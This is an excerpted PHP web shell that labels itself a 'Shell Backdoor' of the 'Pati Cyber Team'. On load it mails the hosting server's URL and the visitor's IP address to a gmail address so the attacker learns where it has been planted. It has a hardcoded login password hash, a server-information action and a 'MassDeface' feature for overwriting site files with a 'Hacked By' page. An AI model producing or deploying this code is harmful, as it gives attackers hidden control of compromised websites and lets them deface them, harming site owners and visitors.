...
$to = 'bahauddinpati@gmail.com';
$path = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
$message = "URL: $path | IP Address :[ " . $_SERVER['REMOTE_ADDR'] . " ]";
mail($to, "Result Logger Mu | bahauddin", $message, "[ " . $_SERVER['REMOTE_ADDR'] . " ]");
@clearstatcache();
...
$password 			= "9279dd8ba953d7a61fcfed43cb642a83";   // bahauddin
$color 				= "#00ff00";
...
<html lang="en">
  <head>
    ...
    <meta charset="utf-8">
		...
		<meta name='author' content='bahauddin'/>
		<meta name='author' content='bahauddin'/>
		<meta name='copyright' content='bahauddin pati cyber team'/>
		<meta name='description' content='bahauddin Backdoor'>
  ...
  <body class="text-white">
    <div class="p-3">
    	<h2 class="text-center">Bahauddin</h2><hr>
    	<img src="https://1.bp.blogspot.com/-apZ0hyGZ6M0/X3IvQ51BzBI/AAAAAAAAAqE/f4ADyVd232syAopUO6JqOm-NhFIqB2NnwCLcBGAsYHQ/s2048/20190108_222537_waifu2x_art_noise2_scale_tta_1.png" class="mx-auto d-block"><hr>
    		<form method="post">
    	<div class="row">
    		<div class="col">
    	...
    	<hr>
    	<center>
    		<small>Copyright &copy; <a href="https://www.tutorialbahauddinstyle.my.id/">Bahauddin</a></small>
    	</center>
    </div>
...
<html>
	...
	<head>
		<meta name='viewport' content='widht=device-widht, initial-scale=0.75'>
		<link rel='icon' type='image/png' href='https://1.bp.blogspot.com/-apZ0hyGZ6M0/X3IvQ51BzBI/AAAAAAAAAqE/f4ADyVd232syAopUO6JqOm-NhFIqB2NnwCLcBGAsYHQ/s2048/20190108_222537_waifu2x_art_noise2_scale_tta_1.png'/>
		<meta name='author' content='bahauddin'/>
		<meta name='Created by' content='Bahauddin'/>
		<meta name='description' content='bahauddin Shell Backdoor'>
                <meta name='theme-color' content='#000'>
...
<a href='?dir=$dir&aksi=InfoServer' class='fiture btn btn-info btn-sm btn-block mt-2'>Info Server</a>
		...
		<div class=''>
			<h1 class='text-center'><a href='https://www.tutorialbahauddinstyle.my.id/'>[ ✓ ] Bahauddin [ ✓ ]</h1>
			<center><p>Shell Backdoor, Pati Cyber Team Jateng Indonesia</a></p></center>
			<hr/>";
		//keluar
	...
	if($_GET['aksi'] == 'MassDeface') {
		...
		echo "</textarea><a href='?dir=$dir' class='btn btn-info btn-block mt-3'>Kembali</a>";
			...
			echo "<form method='post'>
				...
				<textarea name='script' class='form-control' rows='5' placeholder='Hacked By Bahauddin'></textarea><br/>
...
if($ext == "php") {
		...
		echo '<center><small>Copyright all right reserved '.date('M-Y').' <a href="https://www.tutorialbahauddinstyle.my.id/">Bahauddin</a></small></center>';
?>
